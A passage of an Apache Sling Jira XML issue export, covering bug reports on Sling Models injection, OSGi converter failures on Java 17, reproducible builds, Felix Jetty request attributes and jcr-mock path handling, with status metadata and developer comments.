&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-models-impl/blob/a348e50f9321af27dea513d0367b813d3afce9e2/src/main/java/org/apache/sling/models/impl/ModelAdapterFactory.java#L1044&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-models-impl/blob/a348e50f9321af27dea513d0367b813d3afce9e2/src/main/java/org/apache/sling/models/impl/ModelAdapterFactory.java#L1044&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The logic here seems to be that if one of the various items cannot be adapted, an empty collection is returned, instead of a collection ommitting the item that could not be adapted.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13536400">SLING-11881</key>
            <summary>@ChildResource Collection&lt;MyModel&gt; in combination with @PostConstruct Boolean method causes the injection of an empty collection, instead of a collection with all successful items</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="1" iconUrl="https://issues.apache.org/jira/images/icons/statuses/open.png" description="The issue is open and ready for the assignee to start work on it.">Open</status>
                    <statusCategory id="2" key="new" colorName="blue-gray"/>
                                    <resolution id="-1">Unresolved</resolution>
                                        <assignee username="-1">Unassigned</assignee>
                                    <reporter username="Henry Kuijpers">Henry Kuijpers</reporter>
                        <labels>
                    </labels>
                <created>Tue, 16 May 2023 12:28:02 +0000</created>
                <updated>Tue, 16 May 2023 12:30:24 +0000</updated>
                                            <version>Sling Models Impl 1.4.0</version>
                                                    <component>Sling Models</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                        <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 23 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1hxdc:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11880] MetatypeHandlerTest.testUpdateConfiguration fails on Java 17</title>
                <link>https://issues.apache.org/jira/browse/SLING-11880</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;The test fails only on Java 12 and above due to issue &lt;a href=&quot;https://issues.apache.org/jira/browse/FELIX-6157&quot; class=&quot;external-link&quot; rel=&quot;nofollow&quot;&gt;https://issues.apache.org/jira/browse/FELIX-6157&lt;/a&gt; which affects the &lt;tt&gt;org.osgi:org.osgi.util.converter:1.0.0&lt;/tt&gt; artifact as well. Upgrading the Maven dependency to 1.0.8 or newer fixes this issue.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13536275">SLING-11880</key>
            <summary>MetatypeHandlerTest.testUpdateConfiguration fails on Java 17</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="5" iconUrl="https://issues.apache.org/jira/images/icons/statuses/resolved.png" description="A resolution has been taken, and it is awaiting verification by reporter. From here issues are either reopened, or are closed.">Resolved</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="kwin">Konrad Windszus</assignee>
                                    <reporter username="kwin">Konrad Windszus</reporter>
                        <labels>
                    </labels>
                <created>Mon, 15 May 2023 14:21:13 +0000</created>
                <updated>Mon, 15 May 2023 14:33:08 +0000</updated>
                            <resolved>Mon, 15 May 2023 14:33:08 +0000</resolved>
                                    <version>Installer Configuration Factory 1.4.0</version>
                                    <fixVersion>Installer Configuration Factory 1.4.6</fixVersion>
                                    <component>Installer</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17722799" author="kwin" created="Mon, 15 May 2023 14:33:08 +0000"  >&lt;p&gt;Fixed in &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-installer-factory-configuration/commit/8de6e99fbe3ba7c2b705b4d79ee46d86a5b72866&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-installer-factory-configuration/commit/8de6e99fbe3ba7c2b705b4d79ee46d86a5b72866&lt;/a&gt;.&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="12310560">
                    <name>Problem/Incident</name>
                                                                <inwardlinks description="is caused by">
                                        <issuelink>
            <issuekey id="13242994">FELIX-6157</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 23 weeks, 2 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1hwm0:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11879] Update OSGi Converter Dependency to fix Double to BigDecimal conversion with Java 17</title>
                <link>https://issues.apache.org/jira/browse/SLING-11879</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;the unit tests are failing with Java 17 when testing conversion from double values stored in the (mock) repository to BigDecimal.&lt;/p&gt;

&lt;p&gt;the problem is fixed with updating to a more recent OSGi converter version (1.0.8 and up).&lt;/p&gt;</description>
                <environment></environment>
        <key id="13536267">SLING-11879</key>
            <summary>Update OSGi Converter Dependency to fix Double to BigDecimal conversion with Java 17</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="sseifert">Stefan Seifert</assignee>
                                    <reporter username="sseifert">Stefan Seifert</reporter>
                        <labels>
                    </labels>
                <created>Mon, 15 May 2023 13:33:12 +0000</created>
                <updated>Fri, 19 May 2023 10:40:53 +0000</updated>
                            <resolved>Mon, 15 May 2023 13:34:59 +0000</resolved>
                                    <version>Testing ResourceResolver Mock 1.4.0</version>
                    <version>Testing Sling Mock 3.4.8</version>
                                    <fixVersion>Testing ResourceResolver Mock 1.4.2</fixVersion>
                    <fixVersion>Testing Sling Mock 3.4.10</fixVersion>
                                    <component>Testing</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17722781" author="sseifert@pro-vision.de" created="Mon, 15 May 2023 13:34:59 +0000"  >&lt;p&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-testing-sling-mock/commit/ba64446c81291fe66e1f191649dee4565225d75c&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-testing-sling-mock/commit/ba64446c81291fe66e1f191649dee4565225d75c&lt;/a&gt;&lt;br/&gt;
&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-testing-resourceresolver-mock/commit/8375543149b91469a87a907330f90b6689c9200e&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-testing-resourceresolver-mock/commit/8375543149b91469a87a907330f90b6689c9200e&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 23 weeks, 2 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1hwk8:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11875] make sling event reproducible</title>
                <link>https://issues.apache.org/jira/browse/SLING-11875</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;&lt;a href=&quot;https://github.com/jvm-repo-rebuild/reproducible-central/blob/master/content/org/apache/sling/org.apache.sling.event/README.md&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/jvm-repo-rebuild/reproducible-central/blob/master/content/org/apache/sling/org.apache.sling.event/README.md&lt;/a&gt;&lt;/p&gt;</description>
                <environment></environment>
        <key id="13536131">SLING-11875</key>
            <summary>make sling event reproducible</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="1" iconUrl="https://issues.apache.org/jira/images/icons/statuses/open.png" description="The issue is open and ready for the assignee to start work on it.">Open</status>
                    <statusCategory id="2" key="new" colorName="blue-gray"/>
                                    <resolution id="-1">Unresolved</resolution>
                                        <assignee username="-1">Unassigned</assignee>
                                    <reporter username="hboutemy">Herv&#233; Boutemy</reporter>
                        <labels>
                    </labels>
                <created>Sun, 14 May 2023 15:39:25 +0000</created>
                <updated>Thu, 22 Jun 2023 09:12:05 +0000</updated>
                                            <version>Event 4.3.12</version>
                                                    <component>Event</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>3</watches>
                                                                                                                <comments>
                            <comment id="17722729" author="rombert" created="Mon, 15 May 2023 10:23:00 +0000"  >&lt;p&gt;Thanks for the report. Looking at the diff, I see &lt;/p&gt;

&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;&#9474;  # Project dependencies generated by the Apache ServiceMix Maven Plugin
&#9474; -# Generated at: Mon May 08 13:54:49 EDT 2023
&#9474; +# Generated at: Sun May 14 15:04:12 UTC 2023
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;which takes me to &lt;a href=&quot;https://issues.apache.org/jira/browse/SM-5021&quot; title=&quot;fix Reproducible Builds issue for generate-depends&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SM-5021&quot;&gt;&lt;del&gt;SM-5021&lt;/del&gt;&lt;/a&gt;, where I see you are also involved &lt;img class=&quot;emoticon&quot; src=&quot;https://issues.apache.org/jira/images/icons/emoticons/smile.png&quot; height=&quot;16&quot; width=&quot;16&quot; align=&quot;absmiddle&quot; alt=&quot;&quot; border=&quot;0&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=reschke&quot; class=&quot;user-hover&quot; rel=&quot;reschke&quot;&gt;reschke&lt;/a&gt; has asked for a release on &lt;a href=&quot;https://lists.apache.org/thread/7y5zc93m7wbqbgo0193slkgho40sncww&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://lists.apache.org/thread/7y5zc93m7wbqbgo0193slkgho40sncww&lt;/a&gt;, as soon as we have one we&apos;re going to incorporate it.&lt;/p&gt;</comment>
                            <comment id="17736035" author="reschke" created="Thu, 22 Jun 2023 09:12:05 +0000"  >&lt;p&gt;FWIW, I didn&apos;t get any response.&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="10032">
                    <name>Blocker</name>
                                                                <inwardlinks description="is blocked by">
                                        <issuelink>
            <issuekey id="13426429">SM-5021</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 18 weeks ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1hvq8:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11872] Some request attributes not set when running with Felix Jetty 4.2.x</title>
                <link>https://issues.apache.org/jira/browse/SLING-11872</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;When updating the Sling Starter&lt;/p&gt;

&lt;p&gt;org.apache.felix:org.apache.felix.http.jetty from 4.1.14 to 4.2.10 and&lt;br/&gt;
org.apache.felix:org.apache.felix.http.servlet-api from 1.1.4 to 1.2.0&lt;br/&gt;
.&lt;/p&gt;

&lt;p&gt;There are 3 failures in the IncludeIT that show that the&lt;br/&gt;
javax.servlet.include.request_uri attribute is no longer present:&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;error&quot;&gt;&amp;#91;ERROR&amp;#93;&lt;/span&gt; Failures: &lt;br/&gt;
&lt;span class=&quot;error&quot;&gt;&amp;#91;ERROR&amp;#93;&lt;/span&gt;   IncludeTest.testForcedResourceType:149-&amp;gt;assertIncludeRequestAttributes:154-&amp;gt;assertIncludeRequestAttributes:167-&amp;gt;assertRequestAttribute:189 Expected content contains &apos;-&lt;del&gt;javax.servlet.include.request_uri&lt;/del&gt;&apos;&lt;br/&gt;
&lt;span class=&quot;error&quot;&gt;&amp;#91;ERROR&amp;#93;&lt;/span&gt;   IncludeTest.testWithInclude:114-&amp;gt;assertIncludeRequestAttributes:154-&amp;gt;assertIncludeRequestAttributes:167-&amp;gt;assertRequestAttribute:189 Expected content contains &apos;-&lt;del&gt;javax.servlet.include.request_uri&lt;/del&gt;&apos;&lt;br/&gt;
&lt;span class=&quot;error&quot;&gt;&amp;#91;ERROR&amp;#93;&lt;/span&gt;   IncludeTest.testWithIncludeAndExtension:123-&amp;gt;assertIncludeRequestAttributes:154-&amp;gt;assertIncludeRequestAttributes:167-&amp;gt;assertRequestAttribute:189 Expected content contains &apos;-&lt;del&gt;javax.servlet.include.request_uri&lt;/del&gt;&apos;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=cziegeler&quot; class=&quot;user-hover&quot; rel=&quot;cziegeler&quot;&gt;cziegeler&lt;/a&gt; thinks this is due to new code in 4.2.0 &lt;a href=&quot;https://github.com/apache/felix-dev/blob/http-4.x/http/base/src/main/java/org/apache/felix/http/base/internal/dispatch/ServletRequestWrapper.java#L166&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/felix-dev/blob/http-4.x/http/base/src/main/java/org/apache/felix/http/base/internal/dispatch/ServletRequestWrapper.java#L166&lt;/a&gt; and that the solution here is to do the same in Sling Engine as Apache  Felix is doing: instead of setting the attributes on the request,  overwriting the getAttribute method. This avoids leakage of information  as well.&lt;/p&gt;

&lt;p&gt;See also the dev@sling.apache.org discussion at &lt;a href=&quot;https://lists.apache.org/thread/wbfs0bvv0yk8nhggtx969nxwjyxs3c1o&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://lists.apache.org/thread/wbfs0bvv0yk8nhggtx969nxwjyxs3c1o&lt;/a&gt; .&lt;/p&gt;</description>
                <environment></environment>
        <key id="13535950">SLING-11872</key>
            <summary>Some request attributes not set when running with Felix Jetty 4.2.x</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="1" iconUrl="https://issues.apache.org/jira/images/icons/priorities/blocker.svg">Blocker</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="cziegeler">Carsten Ziegeler</assignee>
                                    <reporter username="rombert">Robert Munteanu</reporter>
                        <labels>
                    </labels>
                <created>Fri, 12 May 2023 10:11:34 +0000</created>
                <updated>Fri, 26 May 2023 07:31:27 +0000</updated>
                            <resolved>Wed, 17 May 2023 05:58:39 +0000</resolved>
                                                    <fixVersion>Engine 2.15.0</fixVersion>
                                    <component>Engine</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>3</watches>
                                                                                                                <comments>
                            <comment id="17722373" author="cziegeler" created="Sat, 13 May 2023 14:57:41 +0000"  >&lt;p&gt;First attempt to fix the problem: &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-engine/commit/05b03be33060d5b765752ff7d6052725732cfe6d&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-engine/commit/05b03be33060d5b765752ff7d6052725732cfe6d&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;A new request wrapper takes care of the special include/forward attributes&lt;/p&gt;</comment>
                            <comment id="17722652" author="cziegeler" created="Mon, 15 May 2023 05:12:44 +0000"  >&lt;p&gt;Avoid creating a request wrapper for every include: &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-engine/commit/86cacdb5bef5ecd45bd37f03fe75e5368771f6f3&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-engine/commit/86cacdb5bef5ecd45bd37f03fe75e5368771f6f3&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17722679" author="henry kuijpers" created="Mon, 15 May 2023 07:23:36 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=cziegeler&quot; class=&quot;user-hover&quot; rel=&quot;cziegeler&quot;&gt;cziegeler&lt;/a&gt; I don&apos;t think overriding getAttribute()/setAttribute()/etc is a good plan? Why would it not be sufficient to just put the attributes in the map? That map will be used throughout the entire stack of wrappers around the request, no? (Until that change was made in Apache Felix, of course..)&lt;/p&gt;</comment>
                            <comment id="17722697" author="cziegeler" created="Mon, 15 May 2023 08:23:20 +0000"  >&lt;p&gt;For the consumer, there is no difference. And these attributes are special. If you look at Tomcat or Jetty they do this in a similar manner.&lt;/p&gt;</comment>
                            <comment id="17723351" author="cziegeler" created="Wed, 17 May 2023 05:58:39 +0000"  >&lt;p&gt;Starter tests pass with these changes&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 23 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1hurs:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11868] jcr-mock: MockAuthorizable must not use java.nio.file.Paths</title>
                <link>https://issues.apache.org/jira/browse/SLING-11868</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;MockAuthorizable must not use java.nio.file.Paths to build JCR paths, as it fails utterly on OS where the file separator is not &quot;/&quot; (windows).&lt;/p&gt;</description>
                <environment></environment>
        <key id="13535610">SLING-11868</key>
            <summary>jcr-mock: MockAuthorizable must not use java.nio.file.Paths</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="sseifert">Stefan Seifert</assignee>
                                    <reporter username="sseifert">Stefan Seifert</reporter>
                        <labels>
                    </labels>
                <created>Wed, 10 May 2023 08:44:00 +0000</created>
                <updated>Fri, 19 May 2023 10:40:29 +0000</updated>
                            <resolved>Fri, 12 May 2023 06:52:32 +0000</resolved>
                                    <version>Testing JCR Mock 1.6.8</version>
                                    <fixVersion>Testing JCR Mock 1.6.10</fixVersion>
                                    <component>Testing</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
